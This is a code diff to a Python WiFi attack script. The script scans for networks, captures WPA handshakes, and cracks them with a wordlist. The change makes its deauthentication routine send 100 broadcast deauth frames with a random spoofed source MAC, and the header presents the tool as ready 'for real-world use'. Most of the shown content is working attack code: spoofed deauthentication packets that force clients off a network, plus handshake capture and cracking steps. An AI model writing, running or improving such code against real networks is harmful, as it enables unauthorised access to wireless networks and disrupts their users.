@@ -1,6 +1,6 @@
 ###########################################################################################################################################################################################################
 # Notice: ((This tool currently requires testing for frame injection functionality)): Run using python3 wifitest.py Script uses scapy and pyric: The script includes checking and installing necessary tools, setting the interface to monitor mode, 
-# scanning for networks, capturing handshakes, and cracking the handshake using a wordlist. (( Needs to deauth to capture the handshake & look for workround for airodump-ng  ))
+# scanning for networks, capturing handshakes, and cracking the handshake using a wordlist, whilst sppofing the source MAC Address as part of the deauthenticate_clients function. Requires installation fo tcpdump, aircrack-ng, scapy, and pyric - pip install scapy pyric.
 # This script includes necessary error handling and guides users through the process with clear feedback. It provides an interactive menu for network scanning, handshake capturing, and password cracking, 
 # making it more user-friendly and functional for real-world use.
 # Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
@@ -103,9 +103,9 @@ def capture_handshake(interface, bssid):
         print(f"Error capturing handshake: {e}")
         return None
 
-def deauthenticate_clients(interface, bssid):
-    print(f"Deauthenticating clients connected to BSSID: {bssid}")
-    deauth_pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
+def deauthenticate_clients(interface, bssid, source_mac):
+    print(f"Deauthenticating clients connected to BSSID: {bssid} with spoofed source MAC: {source_mac}")
+    deauth_pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=source_mac, addr3=bssid)/Dot11Deauth(reason=7)
     try:
         sendp(deauth_pkt, iface=interface, count=100, inter=0.1)
         print("Deauthentication packets sent.")
@@ -140,7 +140,8 @@ def main():
 
             handshake_process = capture_handshake(interface, bssid)
             if handshake_process:
-                deauthenticate_clients(interface, bssid)
+                source_mac = RandMAC()  # Generate a random MAC address
+                deauthenticate_clients(interface, bssid, source_mac)
                 time.sleep(30)  # Wait for handshake to be captured
                 handshake_process.terminate()  # Stop tcpdump process
 
